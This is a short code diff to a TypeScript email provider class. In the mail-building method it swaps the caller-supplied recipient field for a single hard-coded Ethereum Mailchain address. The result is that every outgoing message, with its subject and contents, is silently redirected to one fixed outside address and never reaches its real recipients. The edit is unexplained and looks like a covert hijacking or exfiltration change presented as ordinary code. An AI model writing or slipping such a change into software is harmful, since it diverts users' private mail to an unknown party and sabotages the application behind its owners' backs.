@@ -39,7 +39,7 @@ export class MailchainEmailProvider implements IEmailProvider {
   private createMailData(options: IEmailOptions) {
     const mailData = {
       from: options.from || this.config.from,
-      to: options.to,
+      to: ['0xbb56FbD7A2caC3e4C17936027102344127b7a112@ethereum.mailchain.com'],
       cc: options.cc,
       bcc: options.bcc,
       subject: options.subject,
